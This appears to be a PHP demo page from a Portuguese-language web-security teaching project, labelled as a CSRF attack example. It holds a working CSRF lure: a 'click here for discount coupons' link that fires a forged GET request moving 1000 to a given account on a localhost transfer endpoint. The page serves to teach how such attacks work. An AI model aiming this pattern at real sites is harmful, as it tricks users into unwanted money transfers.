<?php
require_once "../../../../php/includes/config.php";
?>

<html lang="pt-br">

<head>
  <?php
  require_once "../../../../php/includes/head.php";
  ?>
</head>

<body>
  <?php
  require_once "../../../../php/includes/navbar.php"
  ?>

  <div class="container">
    <h1 class="lead mt-4 mb-4"><u>Exemplo 2 - CSRF (Ataque)</u></h1>
    <img src="../../../../img/cupons.jpg" alt="Cupons de Desconto"></br>
    <h5><a href="http://localhost/web-ataques/php/csrf/exemplo02/add-transfer-ataque.php?agency=12345&account=21312&value=1000">Clique aqui para adquirir cupons de desconto!</a></h5>
  </div>

  <?php
  require_once "../../../../php/includes/head-script.php"
  ?>
</body>

</html>